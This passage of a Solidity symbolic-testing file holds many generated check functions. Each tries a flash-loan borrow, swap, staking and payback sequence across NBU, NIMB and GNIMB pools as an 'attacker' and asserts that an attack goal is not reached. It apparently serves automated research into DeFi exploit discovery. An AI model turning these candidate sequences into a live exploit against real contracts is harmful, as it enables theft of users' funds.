        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3790(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3791(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3792(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3793(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3794(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3795(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3796(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3797(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3798(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3799(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3800(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3801(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3802(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3803(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3804(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3805(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3806(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3807(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3808(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3809(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3810(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3811(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3812(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3813(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3814(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_nbu_gnimb(amt4);
        payback_pairnbunimb_gnimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3815(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3816(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3817(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3818(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3819(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3820(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3821(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3822(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3823(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3824(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt4 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        borrow_pairnbunimb_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        transaction_gnimbstaking_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        swap_pairnbugnimb_gnimb_nbu(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3825(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3826(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3827(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3828(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        vm.assume(amt5 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3829(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3830(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbugnimb_gnimb_nbu(amt4);
        swap_pairnbunimb_nbu_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3831(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3832(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3833(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt5 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        swap_pairnbunimb_nbu_nimb(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3834(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nimb_nbu(amt3);
        payback_pairnbunimb_nbu(amt4);
        payback_pairnbunimb_nimb(amt5);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand3835(
        uint256 amt0,
